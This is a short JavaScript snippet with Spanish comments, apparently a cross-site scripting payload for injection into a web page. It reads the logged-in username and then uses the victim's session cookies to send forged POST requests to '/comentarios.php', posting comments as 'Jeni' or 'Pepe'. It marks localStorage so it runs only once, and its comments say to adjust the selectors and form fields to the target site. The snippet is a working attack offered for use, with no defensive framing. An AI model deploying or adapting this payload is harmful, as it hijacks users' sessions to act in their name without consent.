console.log("hola")
(function(){
  try {
    // Evitar múltiples ejecuciones
    if (localStorage.getItem('jeniComentado') === '1') return;

    // Detectar usuario actual (ajustá el selector según el sitio)
    const userEl = document.querySelector('#nombre_usuario, .user-name, [data-user]');
    const usuario = (userEl?.textContent || userEl?.getAttribute('data-user') || '')
      .trim().toLowerCase();

    if (usuario === 'jeni') {
      const params = new URLSearchParams();
      // Ajustá estos nombres de campo según el formulario real
      params.append('txtComentario', 'Hola, soy Jeni y dejo mi comentario.');
      params.append('post_id', '1');
      params.append('btnEnviar', 'Enviar');

      fetch('/comentarios.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        credentials: 'include',
        body: params.toString()
      }).then(r => {
        if (r.ok) localStorage.setItem('jeniComentado', '1');
      });
    }
  } catch(e){}


   try {
    // Evitar múltiples ejecuciones
    if (localStorage.getItem('pepeComentado') === '1') return;

    // Detectar usuario actual (ajustá el selector según el sitio)
    const userEl = document.querySelector('#nombre_usuario, .user-name, [data-user]');
    const usuario = (userEl?.textContent || userEl?.getAttribute('data-user') || '')
      .trim().toLowerCase();

      const params = new URLSearchParams();
      // Ajustá estos nombres de campo según el formulario real
      params.append('txtComentario', 'Hola, soy Pepe y dejo mi comentario.');
      params.append('post_id', '1');
      params.append('btnEnviar', 'Enviar');

      fetch('/comentarios.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        credentials: 'include',
        body: params.toString()
      }).then(r => {
        if (r.ok) localStorage.setItem('pepeComentado', '1');
      });
    
  } catch(e){}
  
})();
